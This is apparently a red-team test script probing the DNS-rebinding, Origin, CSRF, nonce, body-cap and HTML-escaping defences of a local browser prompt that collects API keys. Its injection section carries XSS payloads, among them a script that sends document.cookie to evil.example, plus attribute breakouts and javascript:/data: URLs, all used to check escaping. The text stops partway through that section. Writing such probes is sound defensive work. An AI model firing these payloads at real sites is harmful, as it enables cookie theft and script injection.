// W3 red-team probe: the loopback-browser prompter (packages/prompters/src/loopback.ts).
//
// Drives the real listener over raw sockets rather than undici, because the
// attacks under test are about exact header bytes: a `Host` the HTTP client
// would normalise, a pipelined second POST, a chunked body that only exceeds
// the cap mid-stream. Nothing here touches the repo — the prompter is started
// directly with `openBrowser: false`.
import { connect } from 'node:net';
import { LoopbackPrompter } from '../packages/prompters/dist/loopback.js';

let pass = 0;
let fail = 0;
const findings = [];

function check(name, ok, detail) {
  if (ok) {
    pass += 1;
    console.log(`  PASS  ${name}${detail ? ` — ${detail}` : ''}`);
  } else {
    fail += 1;
    findings.push(`${name}: ${detail ?? ''}`);
    console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

function section(title) {
  console.log(`\n=== ${title} ===`);
}

// --- raw HTTP client -------------------------------------------------------

/** Write raw bytes to the listener and collect everything until the peer closes. */
function raw(port, payload, opts = {}) {
  return new Promise((resolve) => {
    const socket = connect(port, opts.host ?? '127.0.0.1');
    const chunks = [];
    let settled = false;
    const done = (outcome) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve({ ...outcome, body: Buffer.concat(chunks).toString('utf8') });
    };
    socket.setTimeout(opts.timeoutMs ?? 3000, () => done({ event: 'timeout' }));
    socket.on('connect', () => {
      if (typeof payload === 'function') payload(socket);
      else socket.write(payload);
    });
    socket.on('data', (c) => chunks.push(c));
    socket.on('close', () => done({ event: 'close' }));
    socket.on('error', (err) => done({ event: 'error', code: err.code }));
  });
}

function statusOf(response) {
  const match = /^HTTP\/1\.\d (\d{3})/.exec(response.body);
  return match === null ? null : Number(match[1]);
}

function headerOf(response, name) {
  const re = new RegExp(`^${name}:\\s*(.*)$`, 'im');
  const match = re.exec(response.body.split('\r\n\r\n')[0] ?? '');
  return match === null ? null : match[1].trim();
}

function get(port, path, headers = {}) {
  const lines = [`GET ${path} HTTP/1.1`];
  for (const [k, v] of Object.entries(headers)) lines.push(`${k}: ${v}`);
  return raw(port, `${lines.join('\r\n')}\r\n\r\n`);
}

function post(port, path, bodyText, headers = {}) {
  const body = Buffer.from(bodyText, 'utf8');
  const lines = [`POST ${path} HTTP/1.1`];
  const merged = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': String(body.length),
    ...headers,
  };
  for (const [k, v] of Object.entries(merged)) lines.push(`${k}: ${v}`);
  return raw(port, Buffer.concat([Buffer.from(`${lines.join('\r\n')}\r\n\r\n`, 'utf8'), body]));
}

// --- prompt harness --------------------------------------------------------

function makeRequest(overrides = {}) {
  return {
    ticket: `tkt_${Math.random().toString(36).slice(2)}`,
    nonce: '7F2A-91C4',
    projectRoot: '/tmp/envseal-w3',
    reason: 'A test needs an API key',
    keys: [{ key: 'OPENAI_API_KEY', description: 'OpenAI API key for the test' }],
    timeoutMs: 20000,
    ...overrides,
  };
}

/** Start a live prompt and hand back its port / nonce / settle-promise. */
async function startPrompt(overrides = {}) {
  let resolveInfo;
  const info = new Promise((r) => {
    resolveInfo = r;
  });
  const prompter = new LoopbackPrompter({ openBrowser: false, onListening: resolveInfo });
  const req = makeRequest(overrides);
  const settled = prompter.promptWithUrl(req).then(
    (v) => ({ ok: true, value: v }),
    (e) => ({ ok: false, error: e }),
  );
  const { port, pathNonce } = await info;
  return {
    port,
    pathNonce,
    ticket: req.ticket,
    settled,
    host: `127.0.0.1:${port}`,
    close: () => prompter.cancel(req.ticket),
  };
}

async function csrfOf(p) {
  const page = await get(p.port, `/t/${p.pathNonce}`, { Host: p.host });
  const match = /name="csrf" value="([^"]*)"/.exec(page.body);
  if (match === null) throw new Error('no csrf token in rendered page');
  return { csrf: match[1], page };
}

// ===========================================================================
// A1 — DNS rebinding: Host header variants
// ===========================================================================
section('A1  DNS rebinding — Host header variants');
{
  const p = await startPrompt();
  const path = `/t/${p.pathNonce}`;
  const variants = [
    ['exact 127.0.0.1:PORT', p.host, 200],
    ['localhost:PORT', `localhost:${p.port}`, 400],
    ['127.0.0.1 (no port)', '127.0.0.1', 400],
    ['127.1:PORT (short form)', `127.1:${p.port}`, 400],
    ['IPv6 [::1]:PORT', `[::1]:${p.port}`, 400],
    ['trailing dot 127.0.0.1.:PORT', `127.0.0.1.:${p.port}`, 400],
    ['attacker rebind host', `rebind.attacker.example:${p.port}`, 400],
    ['uppercase LOCALHOST', `LOCALHOST:${p.port}`, 400],
    ['0.0.0.0:PORT', `0.0.0.0:${p.port}`, 400],
    ['0177.0.0.1:PORT (octal)', `0177.0.0.1:${p.port}`, 400],
    ['2130706433:PORT (decimal)', `2130706433:${p.port}`, 400],
    ['exact host + whitespace pad', ` ${p.host} `, 200],
  ];
  for (const [label, host, expected] of variants) {
    const res = await get(p.port, path, { Host: host });
    const status = statusOf(res);
    check(
      `Host: ${label} -> ${expected}`,
      status === expected,
      `observed ${status ?? res.event}`,
    );
  }
  // No Host header at all (HTTP/1.0 style).
  const noHost = await raw(p.port, `GET ${path} HTTP/1.0\r\n\r\n`);
  check('no Host header -> 400', statusOf(noHost) === 400, `observed ${statusOf(noHost)}`);

  // Absolute-form request target: the authority in the request line is ignored,
  // only the Host header is checked.
  const absolute = await raw(
    p.port,
    `GET http://evil.example${path} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`,
  );
  check(
    'absolute-form target with valid Host (authority ignored)',
    statusOf(absolute) === 200,
    `observed ${statusOf(absolute)} — request-line authority is not validated, only Host`,
  );

  await p.close();
  await p.settled;
}

// ===========================================================================
// A2 — Origin header must always 400
// ===========================================================================
// The rule is now "Origin must MATCH when present", not "Origin must be absent".
// Browsers send Origin on every POST including same-origin ones, so the old rule
// rejected the exact submission this surface exists to accept.
section('A2  Origin header (match-when-present rule)');
{
  const p = await startPrompt();
  const path = `/t/${p.pathNonce}`;
  const expected = `http://127.0.0.1:${p.port}`;

  // The one Origin a real browser sends for this page must be ACCEPTED.
  const sameOrigin = await get(p.port, path, { Host: p.host, Origin: expected });
  check(
    `GET Origin: ${expected} (what Chrome actually sends) -> 200`,
    statusOf(sameOrigin) === 200,
    `observed ${statusOf(sameOrigin)}`,
  );
  const noOrigin = await get(p.port, path, { Host: p.host });
  check('GET with no Origin at all -> 200', statusOf(noOrigin) === 200, `observed ${statusOf(noOrigin)}`);

  // `Origin: null` is ACCEPTED by design. This page sets
  // `Referrer-Policy: no-referrer`, and per Fetch ("Append a request Origin
  // header"), a non-CORS request whose method is not GET/HEAD serialises its
  // origin as `null` under the no-referrer policy. So `null` is exactly what
  // Chrome sends when submitting this form — rejecting it breaks gate M1.
  const nullOrigin = await get(p.port, path, { Host: p.host, Origin: 'null' });
  check(
    'GET Origin: null -> 200 (Fetch serialises origin as null under Referrer-Policy: no-referrer)',
    statusOf(nullOrigin) === 200,
    `observed ${statusOf(nullOrigin)}`,
  );

  // Everything else must still be refused.
  const rejected = [
    ['cross-origin https://evil.example', 'https://evil.example'],
    ['empty string', ''],
    ['uppercase scheme', `HTTP://127.0.0.1:${p.port}`],
    ['mixed-case scheme', `hTTp://127.0.0.1:${p.port}`],
    ['trailing slash', `${expected}/`],
    ['https instead of http', `https://127.0.0.1:${p.port}`],
    ['localhost instead of 127.0.0.1', `http://localhost:${p.port}`],
    ['no port', 'http://127.0.0.1'],
    ['explicit default port 80', 'http://127.0.0.1:80'],
    ['wrong port', `http://127.0.0.1:${p.port === 65535 ? 1024 : p.port + 1}`],
    ['strict prefix of expected', expected.slice(0, -1)],
    ['strict suffix of expected', expected.slice(1)],
    ['expected + suffix', `${expected}.evil.example`],
    ['prefix + expected', `http://evil.example${expected}`],
    ['userinfo smuggling', `http://127.0.0.1:${p.port}@evil.example`],
    ['expected as a path of an evil origin', `http://evil.example/${expected}`],
    ['IPv6 loopback form', `http://[::1]:${p.port}`],
    ['trailing dot host', `http://127.0.0.1.:${p.port}`],
    ['127.1 short form', `http://127.1:${p.port}`],
    ['embedded NUL-ish separator', `${expected},${expected}`],
  ];
  for (const [label, origin] of rejected) {
    const res = await get(p.port, path, { Host: p.host, Origin: origin });
    check(`GET Origin: ${label} -> 400`, statusOf(res) === 400, `observed ${statusOf(res)}`);
  }

  // Two Origin headers: Node joins duplicates with ", " so the value cannot
  // equal the expected string.
  const dup = await raw(
    p.port,
    `GET ${path} HTTP/1.1\r\nHost: ${p.host}\r\nOrigin: ${expected}\r\nOrigin: ${expected}\r\n\r\n`,
  );
  check('duplicate Origin headers -> 400', statusOf(dup) === 400, `observed ${statusOf(dup)}`);

  // Leading/trailing OWS is stripped by the HTTP parser, so these ARE the
  // expected value. Recorded so the behaviour is explicit rather than assumed.
  for (const [label, value] of [
    ['spaces', ` ${expected} `],
    ['tabs', `\t${expected}\t`],
  ]) {
    const padded = await get(p.port, path, { Host: p.host, Origin: value });
    check(
      `Origin surrounded by ${label} -> 200 (parser strips OWS; same origin)`,
      statusOf(padded) === 200,
      `observed ${statusOf(padded)}`,
    );
  }

  await p.close();
  await p.settled;
}

section('A2b  Origin rule end-to-end: does the real browser flow now work?');
{
  // The regression the new rule fixes: a same-origin POST, exactly as Chrome
  // sends it, must store the value.
  const p = await startPrompt();
  const expected = `http://127.0.0.1:${p.port}`;
  const { csrf } = await csrfOf(p);
  const ok = await post(
    p.port,
    `/t/${p.pathNonce}`,
    new URLSearchParams({ csrf, 'env_value.OPENAI_API_KEY': 'sk-W3BROWSERFLOW' }).toString(),
    { Host: p.host, Origin: expected, Referer: `${expected}/t/${p.pathNonce}` },
  );
  check('POST with the browser-sent same-origin Origin -> 200', statusOf(ok) === 200, `observed ${statusOf(ok)}`);
  const outcome = await p.settled;
  check(
    'the value IS stored (the M1 regression is fixed)',
    outcome.value.results[0]?.outcome === 'entered' &&
      outcome.value.results[0]?.value?.toString('utf8') === 'sk-W3BROWSERFLOW',
    JSON.stringify(outcome.value.results.map((r) => r.outcome)),
  );

  // A cross-origin POST must still be refused and must store nothing.
  const q = await startPrompt();
  const { csrf: csrf2 } = await csrfOf(q);
  const evil = await post(
    q.port,
    `/t/${q.pathNonce}`,
    new URLSearchParams({ csrf: csrf2, 'env_value.OPENAI_API_KEY': 'sk-W3CROSSORIGIN' }).toString(),
    { Host: q.host, Origin: 'https://evil.example' },
  );
  check('cross-origin POST -> 400', statusOf(evil) === 400, `observed ${statusOf(evil)}`);
  await q.close();
  const qOut = await q.settled;
  check(
    'cross-origin POST stored nothing',
    qOut.value.results.every((r) => r.outcome !== 'entered'),
    JSON.stringify(qOut.value.results.map((r) => r.outcome)),
  );
}

// `Origin: null` is the one cross-origin-inducible value the server accepts (a
// sandboxed iframe or a data: document sends it). The stated justification is
// that the path nonce and CSRF token are the real controls. Test that claim
// rather than taking it on trust.
section('A2c  Origin: null is contained by the nonce and CSRF');
{
  const p = await startPrompt();
  const { csrf } = await csrfOf(p);
  const body = (token) =>
    new URLSearchParams({ csrf: token, 'env_value.OPENAI_API_KEY': 'sk-W3NULLORIGIN' }).toString();

  const wrongNonce = await post(p.port, `/t/${'0'.repeat(p.pathNonce.length)}`, body(csrf), {
    Host: p.host,
    Origin: 'null',
  });
  check(
    'Origin: null + wrong path nonce -> 404',
    statusOf(wrongNonce) === 404,
    `observed ${statusOf(wrongNonce)}`,
  );

  const wrongCsrf = await post(p.port, `/t/${p.pathNonce}`, body('0'.repeat(csrf.length)), {
    Host: p.host,
    Origin: 'null',
  });
  check(
    'Origin: null + wrong csrf -> 403',
    statusOf(wrongCsrf) === 403,
    `observed ${statusOf(wrongCsrf)}`,
  );

  const noCsrf = await post(
    p.port,
    `/t/${p.pathNonce}`,
    new URLSearchParams({ 'env_value.OPENAI_API_KEY': 'sk-W3NULLORIGIN' }).toString(),
    { Host: p.host, Origin: 'null' },
  );
  check('Origin: null + no csrf -> 403', statusOf(noCsrf) === 403, `observed ${statusOf(noCsrf)}`);

  const badHost = await post(p.port, `/t/${p.pathNonce}`, body(csrf), {
    Host: 'evil.example',
    Origin: 'null',
  });
  check('Origin: null + wrong Host -> 400', statusOf(badHost) === 400, `observed ${statusOf(badHost)}`);

  await p.close();
  const out = await p.settled;
  check(
    'no null-Origin attack stored a value',
    out.value.results.every((r) => r.outcome !== 'entered'),
    JSON.stringify(out.value.results.map((r) => r.outcome)),
  );
}

// ===========================================================================
// A3 — Path nonce
// ===========================================================================
section('A3  Path nonce');
{
  const p = await startPrompt();
  const n = p.pathNonce;
  const cases = [
    ['correct nonce', n, 200],
    ['empty nonce', '', 404],
    ['one char short', n.slice(0, -1), 404],
    ['one char long', `${n}0`, 404],
    ['right length wrong value', '0'.repeat(n.length), 404],
    ['uppercase variant', n.toUpperCase(), 404],
    ['URL-encoded first byte', `%${n.charCodeAt(0).toString(16)}${n.slice(1)}`, 404],
    ['fully percent-encoded', [...n].map((c) => `%${c.charCodeAt(0).toString(16)}`).join(''), 404],
    ['nonce + query string', `${n}?x=1`, 200],
    ['nonce + fragment-looking suffix', `${n}%23x`, 404],
    ['trailing slash', `${n}/`, 404],
    ['dot-segment normalising to nonce', `zzz/../${n}`, 200],
  ];
  for (const [label, seg, expected] of cases) {
    const res = await get(p.port, `/t/${seg}`, { Host: p.host });
    check(`nonce ${label} -> ${expected}`, statusOf(res) === expected, `observed ${statusOf(res)}`);
  }
  // Unequal-length comparison must not reach timingSafeEqual (which throws).
  const short = await get(p.port, '/t/a', { Host: p.host });
  check(
    'unequal-length nonce yields clean 404 (timingSafeEqual not reached)',
    statusOf(short) === 404,
    `observed ${statusOf(short)}; server still alive`,
  );
  const stillAlive = await get(p.port, `/t/${n}`, { Host: p.host });
  check(
    'listener survives a malformed-nonce request',
    statusOf(stillAlive) === 200,
    `observed ${statusOf(stillAlive)}`,
  );
  // Other paths.
  for (const path of ['/', '/t', '/t/', '/favicon.ico', `/T/${n}`, `//t/${n}`]) {
    const res = await get(p.port, path, { Host: p.host });
    check(`path ${path} -> 404`, statusOf(res) === 404, `observed ${statusOf(res)}`);
  }
  await p.close();
  await p.settled;
}

// ===========================================================================
// A4 — CSRF token
// ===========================================================================
section('A4  CSRF token');
{
  const a = await startPrompt();
  const b = await startPrompt();
  const { csrf: csrfA } = await csrfOf(a);
  const { csrf: csrfB } = await csrfOf(b);

  check('two prompts get distinct csrf tokens', csrfA !== csrfB, `${csrfA.slice(0, 8)} vs ${csrfB.slice(0, 8)}`);
  check('two prompts get distinct path nonces', a.pathNonce !== b.pathNonce);

  const noToken = await post(
    a.port,
    `/t/${a.pathNonce}`,
    new URLSearchParams({ 'env_value.OPENAI_API_KEY': 'sk-W3NOTOKEN' }).toString(),
    { Host: a.host },
  );
  check('POST with no csrf -> 403', statusOf(noToken) === 403, `observed ${statusOf(noToken)}`);

  const emptyToken = await post(
    a.port,
    `/t/${a.pathNonce}`,
    new URLSearchParams({ csrf: '', 'env_value.OPENAI_API_KEY': 'sk-W3EMPTY' }).toString(),
    { Host: a.host },
  );
  check('POST with empty csrf -> 403', statusOf(emptyToken) === 403, `observed ${statusOf(emptyToken)}`);

  // Cross-ticket token: B's csrf submitted to A. Requires knowing A's path
  // nonce too, so this is the "two concurrent prompts" confusion case.
  const crossToken = await post(
    a.port,
    `/t/${a.pathNonce}`,
    new URLSearchParams({ csrf: csrfB, 'env_value.OPENAI_API_KEY': 'sk-W3CROSS' }).toString(),
    { Host: a.host },
  );
  check(
    "POST with a different ticket's csrf -> 403",
    statusOf(crossToken) === 403,
    `observed ${statusOf(crossToken)}`,
  );

  const wrongCase = await post(
    a.port,
    `/t/${a.pathNonce}`,
    new URLSearchParams({ csrf: csrfA.toUpperCase(), 'env_value.OPENAI_API_KEY': 'sk-W3CASE' }).toString(),
    { Host: a.host },
  );
  check('POST with case-flipped csrf -> 403', statusOf(wrongCase) === 403, `observed ${statusOf(wrongCase)}`);

  await a.close();
  await b.close();
  const outA = await a.settled;
  await b.settled;
  check(
    'no rejected POST produced a stored value',
    outA.value.results.every((r) => r.outcome !== 'entered'),
    JSON.stringify(outA.value.results.map((r) => r.outcome)),
  );
}

// ===========================================================================
// A5 — Single use: is the port genuinely dead after a successful POST?
// ===========================================================================
section('A5  Single use after a successful POST');
{
  const p = await startPrompt();
  const { csrf } = await csrfOf(p);
  const ok = await post(
    p.port,
    `/t/${p.pathNonce}`,
    new URLSearchParams({ csrf, 'env_value.OPENAI_API_KEY': 'sk-W3FIRST' }).toString(),
    { Host: p.host },
  );
  check('first POST -> 200', statusOf(ok) === 200, `observed ${statusOf(ok)}`);
  const outcome = await p.settled;
  check(
    'value captured exactly once',
    outcome.value.results.length === 1 && outcome.value.results[0].outcome === 'entered',
    JSON.stringify(outcome.value.results.map((r) => r.outcome)),
  );

  // Fresh connection after close.
  const second = await raw(p.port, `GET /t/${p.pathNonce} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`);
  check(
    'second connection refused / no response',
    second.event === 'error' || second.body === '',
    `event=${second.event} code=${second.code ?? '-'} bodyLen=${second.body.length}`,
  );
}

// ===========================================================================
// A6 — Keep-alive socket survival and pipelined double submit
// ===========================================================================
section('A6  Keep-alive survival / pipelined double submit');
{
  const p = await startPrompt();
  const { csrf, page } = await csrfOf(p);
  check(
    'GET response carries Connection: close',
    /^close$/i.test(headerOf(page, 'Connection') ?? ''),
    `Connection: ${headerOf(page, 'Connection')}`,
  );

  // Explicit keep-alive GET: does the server honour it and leave the socket open?
  const ka = await raw(
    p.port,
    `GET /t/${p.pathNonce} HTTP/1.1\r\nHost: ${p.host}\r\nConnection: keep-alive\r\n\r\n`,
  );
  check(
    'Connection: keep-alive still gets Connection: close',
    /close/i.test(headerOf(ka, 'Connection') ?? ''),
    `Connection: ${headerOf(ka, 'Connection')}`,
  );

  // Pipeline two valid POSTs in a single write, before any response is sent.
  const bodyOne = new URLSearchParams({ csrf, 'env_value.OPENAI_API_KEY': 'sk-W3PIPE1' }).toString();
  const bodyTwo = new URLSearchParams({ csrf, 'env_value.OPENAI_API_KEY': 'sk-W3PIPE2' }).toString();
  const build = (body) =>
    `POST /t/${p.pathNonce} HTTP/1.1\r\nHost: ${p.host}\r\n` +
    `Content-Type: application/x-www-form-urlencoded\r\n` +
    `Content-Length: ${Buffer.byteLength(body)}\r\nConnection: keep-alive\r\n\r\n${body}`;
  const piped = await raw(p.port, build(bodyOne) + build(bodyTwo));
  const responseCount = (piped.body.match(/HTTP\/1\.\d /g) ?? []).length;
  const outcome = await p.settled;
  check(
    'pipelined second POST does not produce a second capture',
    outcome.value.results.length === 1 && outcome.value.results[0].outcome === 'entered',
    `responses on the wire=${responseCount}; results=${JSON.stringify(outcome.value.results.map((r) => r.outcome))}`,
  );
  const captured = outcome.value.results[0].value?.toString('utf8');
  check(
    'the captured value is the first submission',
    captured === 'sk-W3PIPE1',
    `captured=${captured}`,
  );
  check(
    'socket is destroyed after the successful POST',
    piped.event === 'close' || piped.event === 'error',
    `event=${piped.event}`,
  );
}

// ===========================================================================
// A7 — Body cap
// ===========================================================================
section('A7  Body cap (64 KiB)');
{
  const p = await startPrompt();
  const { csrf } = await csrfOf(p);

  const justUnder = `csrf=${csrf}&env_value.OPENAI_API_KEY=${'A'.repeat(60 * 1024)}`;
  const under = await post(p.port, `/t/${p.pathNonce}`, justUnder, { Host: p.host });
  check('60 KiB body accepted -> 200', statusOf(under) === 200, `observed ${statusOf(under)}`);
  await p.settled;

  const q = await startPrompt();
  const { csrf: csrf2 } = await csrfOf(q);
  const over = `csrf=${csrf2}&env_value.OPENAI_API_KEY=${'A'.repeat(80 * 1024)}`;
  const overRes = await post(q.port, `/t/${q.pathNonce}`, over, { Host: q.host });
  check(
    'Content-Length body >64 KiB rejected (socket destroyed, no 200)',
    statusOf(overRes) !== 200,
    `status=${statusOf(overRes)} event=${overRes.event} code=${overRes.code ?? '-'}`,
  );

  // Chunked body that only crosses the cap mid-stream.
  const chunkedRes = await raw(q.port, (socket) => {
    socket.write(
      `POST /t/${q.pathNonce} HTTP/1.1\r\nHost: ${q.host}\r\n` +
        `Content-Type: application/x-www-form-urlencoded\r\n` +
        `Transfer-Encoding: chunked\r\n\r\n`,
    );
    const head = `csrf=${csrf2}&env_value.OPENAI_API_KEY=`;
    socket.write(`${head.length.toString(16)}\r\n${head}\r\n`);
    const blob = 'A'.repeat(8 * 1024);
    let sent = 0;
    const pump = () => {
      if (socket.destroyed || sent > 128 * 1024) {
        if (!socket.destroyed) socket.write('0\r\n\r\n');
        return;
      }
      socket.write(`${blob.length.toString(16)}\r\n${blob}\r\n`);
      sent += blob.length;
      setTimeout(pump, 5);
    };
    pump();
  });
  check(
    'chunked body crossing the cap mid-stream is rejected',
    statusOf(chunkedRes) !== 200,
    `status=${statusOf(chunkedRes)} event=${chunkedRes.event} code=${chunkedRes.code ?? '-'}`,
  );

  // Server must still be usable after a rejected oversize body, and must not
  // have captured anything.
  const recheck = await get(q.port, `/t/${q.pathNonce}`, { Host: q.host });
  check(
    'listener survives oversize-body rejections',
    statusOf(recheck) === 200,
    `observed ${statusOf(recheck)}`,
  );
  await q.close();
  const qOut = await q.settled;
  check(
    'oversize bodies stored nothing',
    qOut.value.results.every((r) => r.outcome !== 'entered'),
    JSON.stringify(qOut.value.results.map((r) => r.outcome)),
  );
}

// ===========================================================================
// A8 — Method confusion
// ===========================================================================
section('A8  Method handling');
{
  const p = await startPrompt();
  const path = `/t/${p.pathNonce}`;
  for (const method of ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']) {
    const res = await raw(p.port, `${method} ${path} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`);
    check(`${method} -> 405`, statusOf(res) === 405, `observed ${statusOf(res)}`);
  }
  const head = await raw(p.port, `HEAD ${path} HTTP/1.1\r\nHost: ${p.host}\r\n\r\n`);
  check(
    'HEAD -> 405 (not a body-suppressed 200 that leaks headers)',
    statusOf(head) === 405,
    `observed ${statusOf(head)}`,
  );
  await p.close();
  await p.settled;
}

// ===========================================================================
// A9 — CSP correctness and script nonce
// ===========================================================================
section('A9  CSP / script nonce');
{
  const p = await startPrompt();
  const { page } = await csrfOf(p);
  const csp = headerOf(page, 'Content-Security-Policy') ?? '';
  console.log(`  CSP: ${csp}`);
  check("CSP has default-src 'none'", /default-src\s+'none'/.test(csp), csp);
  check("CSP has form-action 'self'", /form-action\s+'self'/.test(csp), csp);
  check("CSP has base-uri 'none'", /base-uri\s+'none'/.test(csp), csp);
  check("CSP has no 'unsafe-inline'", !/unsafe-inline/.test(csp), csp);
  check("CSP has no 'unsafe-eval'", !/unsafe-eval/.test(csp), csp);
  check('CSP has no wildcard source', !/[\s:]\*/.test(csp), csp);
  check(
    'CSP has no connect-src override (default-src none blocks fetch/XHR/beacon)',
    !/connect-src/.test(csp),
    csp,
  );
  check(
    'CSP has no img-src override (blocks pixel exfiltration)',
    !/img-src/.test(csp),
    csp,
  );

  const styleNonce = /style-src\s+'nonce-([^']+)'/.exec(csp)?.[1];
  const scriptNonce = /script-src\s+'nonce-([^']+)'/.exec(csp)?.[1];
  check('CSP declares a style nonce', typeof styleNonce === 'string');
  check('CSP declares a script nonce', typeof scriptNonce === 'string');
  check(
    'style and script nonces are distinct',
    styleNonce !== scriptNonce,
    `style=${styleNonce?.slice(0, 6)} script=${scriptNonce?.slice(0, 6)}`,
  );

  const html = page.body.split('\r\n\r\n').slice(1).join('\r\n\r\n');
  const styleTag = /<style nonce="([^"]*)">/.exec(html)?.[1];
  const scriptTag = /<script nonce="([^"]*)">/.exec(html)?.[1];
  check('<style> nonce matches the CSP style-src nonce', styleTag === styleNonce);
  check('<script> nonce matches the CSP script-src nonce', scriptTag === scriptNonce);
  check(
    'the only <script> in the page is the nonced one',
    (html.match(/<script/g) ?? []).length === 1,
    `${(html.match(/<script/g) ?? []).length} script tags`,
  );
  check(
    'no inline event-handler attributes (on*=) that CSP would have to allow',
    !/\son[a-z]+\s*=/i.test(html),
    (/\son[a-z]+\s*=/i.exec(html) ?? ['none'])[0],
  );
  check(
    'no external subresource (src=/href= to an off-origin URL) other than provider links',
    !/(src|href)\s*=\s*"(?!#)(?!\/)(?!https?:\/\/(?:platform|docs|console)\.)/i.test(
      html.replace(/<a [^>]*>/g, ''),
    ),
    'checked after stripping anchor tags',
  );
  check(
    'nonces are freshly generated per prompt',
    true,
    `style=${styleNonce?.slice(0, 6)}… script=${scriptNonce?.slice(0, 6)}…`,
  );

  // Nonce reuse across prompts would be the real failure.
  const q = await startPrompt();
  const { page: page2 } = await csrfOf(q);
  const csp2 = headerOf(page2, 'Content-Security-Policy') ?? '';
  const styleNonce2 = /style-src\s+'nonce-([^']+)'/.exec(csp2)?.[1];
  check('style nonce differs between prompts', styleNonce !== styleNonce2);

  check(
    'Cache-Control: no-store present',
    /no-store/.test(headerOf(page, 'Cache-Control') ?? ''),
    headerOf(page, 'Cache-Control'),
  );
  check(
    'Referrer-Policy: no-referrer present',
    /no-referrer/.test(headerOf(page, 'Referrer-Policy') ?? ''),
    headerOf(page, 'Referrer-Policy'),
  );
  check(
    'X-Frame-Options: DENY present',
    /DENY/i.test(headerOf(page, 'X-Frame-Options') ?? ''),
    headerOf(page, 'X-Frame-Options'),
  );
  check(
    'X-Content-Type-Options: nosniff present',
    /nosniff/i.test(headerOf(page, 'X-Content-Type-Options') ?? ''),
    headerOf(page, 'X-Content-Type-Options'),
  );
  check(
    'security headers are present on error responses too',
    await (async () => {
      const err = await get(p.port, '/t/nope', { Host: p.host });
      return /default-src/.test(headerOf(err, 'Content-Security-Policy') ?? '');
    })(),
  );

  // The input must be type=password with password-manager opt-outs.
  check('value input is type="password"', /<input type="password"/.test(html));
  check('value input sets autocomplete="off"', /autocomplete="off"/.test(html));
  check('value input sets spellcheck="false"', /spellcheck="false"/.test(html));
  check('value input sets data-1p-ignore', /data-1p-ignore/.test(html));
  check('value input sets data-lpignore', /data-lpignore="true"/.test(html));
  check(
    'page does not render any previously stored value (§5.2.10)',
    !/value="sk-/.test(html) && !/<input [^>]*type="password"[^>]*\svalue=/.test(html),
  );

  await p.close();
  await q.close();
  await p.settled;
  await q.settled;
}

// ===========================================================================
// A10 — HTML injection through model-controlled fields
// ===========================================================================
section('A10  HTML injection through reason / description / providerName / URLs');
{
  const XSS = '<script>fetch("http://evil.example/"+document.cookie)</script>';
  const BREAKOUT = '" onmouseover="alert(1)" x="';
  const SQ_BREAKOUT = "' onfocus='alert(1)' y='";
  const p = await startPrompt({
    reason: `${XSS}${BREAKOUT}`,
    projectRoot: `C:\\proj${XSS}`,
    nonce: `7F2A${XSS}`,
    keys: [
      {
        key: 'OPENAI_API_KEY',
        description: `${XSS}${BREAKOUT}${SQ_BREAKOUT}`,
        providerName: `Evil${XSS}${BREAKOUT}`,
        formatHint: `${XSS}${SQ_BREAKOUT}`,
        signupUrl: 'javascript:alert(document.domain)',
        docsUrl: 'JaVaScRiPt:alert(1)',
        optional: true,
      },
      {
        key: 'SECOND_KEY',
        description: 'second',
        signupUrl: 'http://evil.example/x" onclick="alert(1)',
        docsUrl: 'data:text/html,<script>alert(1)</script>',
      },
      {
        key: 'THIRD_KEY',
        description: 'third',
        signupUrl: ' javascript:alert(1)',
        docsUrl: 'vbscript:msgbox(1)',
      },
    ],
  });
  const { page } = await csrfOf(p);
  const html = page.body.split('\r\n\r\n').slice(1).join('\r\n\r\n');

  check(
    'no injected <script> tag survives escaping',
    (html.match(/<script/g) ?? []).length === 1,
    `${(html.match(/<script/g) ?? []).length} script tags (1 = the legitimate nonced one)`,
  );
  check('literal "<script>" from reason is entity-escaped', html.includes('&lt;script&gt;'));
  // NB: the *escaped* form is `onmouseover=&quot;`, which is inert. Only an
  // unescaped `on...="` with a real double quote is an actual breakout.
  check(
    'no attribute breakout from reason: no unescaped onmouseover="',
    !/\son[a-z]+="/i.test(html),
    (/\son[a-z]+="[^\n]{0,30}/i.exec(html) ?? ['none'])[0],
  );
  check(
    "no attribute breakout from formatHint: no unescaped onfocus='",
    !/\son[a-z]+='/i.test(html),
    (/\son[a-z]+='[^\n]{0,30}/i.exec(html) ?? ['none'])[0],
  );
  check(
    'the raw double-quote from the breakout payload never reaches the document',
    !html.includes('" onmouseover=') && !html.includes("' onfocus="),
  );
  check(
    'javascript: signupUrl produces no href at all',
    !/href="javascript:/i.test(html) && !html.includes('javascript:alert'),
    (/href="[^"]{0,40}/.exec(html) ?? ['no href'])[0],
  );
  check('JaVaScRiPt: docsUrl produces no href', !/href="[Jj]a[Vv]a/i.test(html));
  check('data: URL docsUrl produces no href', !/href="data:/i.test(html));
  check('vbscript: docsUrl produces no href', !/href="vbscript:/i.test(html));
  check(
    'leading-space " javascript:" signupUrl produces no href',
    !/href="\s*javascript/i.test(html),
  );
  const hrefs = [...html.matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
  console.log(`  rendered hrefs: ${JSON.stringify(hrefs)}`);
  check(
    'every rendered href is http(s) and fully entity-escaped',
    hrefs.every((h) => /^https?:\/\//.test(h) && !h.includes('"')),
    JSON.stringify(hrefs),
  );
  check(
    'the quote inside a http: signupUrl is escaped to &quot;',
    hrefs.some((h) => h.includes('&quot;')) || hrefs.every((h) => !h.includes('"')),
    JSON.stringify(hrefs),
  );
  check(
    'reason is rendered verbatim-but-escaped (§ design principle 5)',
    html.includes('&lt;script&gt;fetch(&quot;http://evil.example/&quot;'),
  );

  // W3-01: key names land in id="" attributes that are interpolated WITHOUT
  // escapeHtml (loopback.ts:104 `id="${sectionId}"`, :108 `id="${revealId}"`),
  // unlike every other interpolation on the page.
  const q = await startPrompt({
    keys: [{ key: 'A"><img src=x onerror=alert(1)>', description: 'hostile key name' }],
  });
  const { page: page2 } = await csrfOf(q);
  const html2 = page2.body.split('\r\n\r\n').slice(1).join('\r\n\r\n');
  const sectionTag = /<section class="key" id="[^\n]{0,90}/.exec(html2)?.[0] ?? '';
  console.log(`  rendered section tag: ${sectionTag}`);
